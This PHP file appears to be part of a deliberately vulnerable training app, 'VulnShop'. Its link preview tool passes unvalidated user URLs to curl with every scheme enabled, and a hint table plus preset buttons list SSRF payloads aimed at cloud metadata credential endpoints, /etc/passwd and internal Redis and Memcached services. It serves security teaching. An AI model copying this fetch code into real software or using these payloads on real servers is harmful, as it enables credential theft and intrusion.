<?php
// ============================================================
//  VulnShop - URL Fetcher / Link Preview Tool
//  VULNERABILITIES:
//  - SSRF: server-side request forgery via user-controlled URL
//  - Internal network scanning via SSRF
//  - Cloud metadata access (AWS/GCP/Azure IMDSv1)
//  - File read via file:// scheme
//  - Port scanning via SSRF timing
//  - Header injection via newlines in URL
// ============================================================
$page_title = 'Link Preview Tool';
require_once 'includes/header.php';

$response_body    = '';
$response_headers = '';
$response_code    = '';
$url_fetched      = '';
$error            = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['url'])) {
    // VULNERABILITY: URL not validated — full SSRF
    $url = $_POST['url'];
    $url_fetched = $url;

    $follow_redirects = isset($_POST['follow_redirects']);
    $show_headers     = isset($_POST['show_headers']);

    // VULNERABILITY: curl with user-supplied URL, all schemes allowed
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL,            $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT,        10);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, $follow_redirects);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);  // VULNERABILITY: SSL not verified
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_HEADER,         true);   // include response headers
    // VULNERABILITY: User-Agent not restricted — can be used for fingerprinting
    curl_setopt($ch, CURLOPT_USERAGENT,      'VulnShop/1.0 (+http://localhost/vuln-shop)');

    // Allow ALL URL schemes (file://, dict://, gopher://, etc.)
    // VULNERABILITY: no scheme whitelist
    curl_setopt($ch, CURLOPT_PROTOCOLS,
        CURLPROTO_HTTP | CURLPROTO_HTTPS | CURLPROTO_FTP |
        CURLPROTO_FILE | CURLPROTO_DICT | CURLPROTO_GOPHER
    );

    $raw = curl_exec($ch);
    $response_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $header_size   = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $curl_err      = curl_error($ch);
    curl_close($ch);

    if ($raw === false || $curl_err) {
        $error = "cURL error: $curl_err";
    } else {
        $response_headers = substr($raw, 0, $header_size);
        $response_body    = substr($raw, $header_size);
    }
}
?>

<div class="page-title">
    <h1><i class="fas fa-globe"></i> Link Preview Tool</h1>
    <span class="vuln-tag">SSRF</span>
</div>

<div class="lab-hint">
    <h4><i class="fas fa-flask"></i> Vulnerability: Server-Side Request Forgery (SSRF)</h4>
    <table>
        <tr><th>Target</th><th>URL Payload</th><th>Goal</th></tr>
        <tr><td>AWS Metadata</td>   <td><code>http://169.254.169.254/latest/meta-data/</code></td><td>IAM credentials, instance info</td></tr>
        <tr><td>AWS IMDSv2 token</td><td><code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code></td><td>Role creds</td></tr>
        <tr><td>GCP Metadata</td>   <td><code>http://metadata.google.internal/computeMetadata/v1/</code></td><td>GCP instance data</td></tr>
        <tr><td>Azure Metadata</td> <td><code>http://169.254.169.254/metadata/instance?api-version=2021-02-01</code></td><td>Azure instance data</td></tr>
        <tr><td>Localhost services</td><td><code>http://127.0.0.1:8080/</code></td><td>Internal admin panels</td></tr>
        <tr><td>Internal network</td><td><code>http://192.168.1.1/</code></td><td>Router admin</td></tr>
        <tr><td>File read</td>      <td><code>file:///etc/passwd</code></td><td>Local file system</td></tr>
        <tr><td>File read (Win)</td><td><code>file:///C:/Windows/win.ini</code></td><td>Windows files</td></tr>
        <tr><td>Dict protocol</td>  <td><code>dict://127.0.0.1:11211/stats</code></td><td>Memcached stats</td></tr>
        <tr><td>Port scan</td>      <td><code>http://127.0.0.1:22/</code></td><td>Detect open ports via timing/error</td></tr>
        <tr><td>Redis</td>          <td><code>dict://127.0.0.1:6379/info</code></td><td>Redis server info</td></tr>
        <tr><td>SMTP</td>           <td><code>dict://127.0.0.1:25/EHLO</code></td><td>Internal SMTP</td></tr>
    </table>
</div>

<div style="display:flex;flex-wrap:wrap;gap:8px;margin-bottom:16px">
    <button class="btn btn-sm btn-outline"  onclick="setUrl('http://example.com')">example.com</button>
    <button class="btn btn-sm btn-danger"   onclick="setUrl('http://127.0.0.1/')">localhost</button>
    <button class="btn btn-sm btn-danger"   onclick="setUrl('http://169.254.169.254/latest/meta-data/')">AWS Metadata</button>
    <button class="btn btn-sm btn-danger"   onclick="setUrl('file:///etc/passwd')">/etc/passwd</button>
    <button class="btn btn-sm btn-danger"   onclick="setUrl('file:///C:/Windows/win.ini')">win.ini</button>
    <button class="btn btn-sm btn-warning"  onclick="setUrl('http://127.0.0.1:3306/')">MySQL:3306</button>
    <button class="btn btn-sm btn-warning"  onclick="setUrl('dict://127.0.0.1:6379/info')">Redis</button>
    <button class="btn btn-sm btn-warning"  onclick="setUrl('http://127.0.0.1:8080/')">:8080</button>
</div>

<div class="two-col-layout">
    <div class="checkout-section">
        <h3><i class="fas fa-link"></i> Fetch URL</h3>
        <form method="POST">
            <div class="form-group">
                <label>URL <small style="color:#e74c3c">(any scheme: http, https, file, dict, gopher)</small></label>
                <input type="text" name="url" id="url_input" class="form-control"
                       value="<?php echo htmlspecialchars($url_fetched); ?>"
                       placeholder="http://169.254.169.254/latest/meta-data/">
            </div>
            <div style="display:flex;gap:16px;margin-bottom:12px;font-size:0.88rem">
                <label>
                    <input type="checkbox" name="follow_redirects" <?php echo $follow_redirects??false ? 'checked' : ''; ?>>
                    Follow Redirects
                </label>
                <label>
                    <input type="checkbox" name="show_headers" checked>
                    Show Response Headers
                </label>
            </div>
            <button type="submit" class="btn btn-primary">
                <i class="fas fa-paper-plane"></i> Fetch
            </button>
        </form>

        <?php if ($response_code): ?>
        <div style="margin-top:16px">
            <p><strong>HTTP Status:</strong>
                <span style="color:<?php echo $response_code >= 200 && $response_code < 300 ? 'green' : 'red'; ?>">
                    <?php echo $response_code; ?>
                </span>
            </p>
        </div>
        <?php endif; ?>
    </div>

    <div>
        <?php if ($error): ?>
            <div class="alert alert-danger"><?php echo htmlspecialchars($error); ?></div>
        <?php endif; ?>

        <?php if ($response_headers): ?>
        <div class="checkout-section" style="margin-bottom:16px">
            <h3>Response Headers</h3>
            <pre class="file-output" style="max-height:150px"><?php echo htmlspecialchars($response_headers); ?></pre>
        </div>
        <?php endif; ?>

        <?php if ($response_body !== ''): ?>
        <div class="checkout-section">
            <h3>Response Body <small style="font-weight:normal;color:#64748b">(<?php echo strlen($response_body); ?> bytes)</small></h3>
            <pre class="file-output" style="max-height:380px"><?php echo htmlspecialchars(substr($response_body, 0, 8000)); ?></pre>
            <?php if (strlen($response_body) > 8000): ?>
                <p style="color:#94a3b8;font-size:0.8rem">[Truncated — <?php echo strlen($response_body); ?> total bytes]</p>
            <?php endif; ?>
        </div>
        <?php endif; ?>

        <?php if (!$error && $response_body === '' && !$url_fetched): ?>
            <div class="checkout-section">
                <p style="color:#94a3b8;text-align:center;padding:30px 0">Fetch a URL to see the response.</p>
            </div>
        <?php endif; ?>
    </div>
</div>

<script>
function setUrl(u) { document.getElementById('url_input').value = u; }
</script>

<?php require_once 'includes/footer.php'; ?>
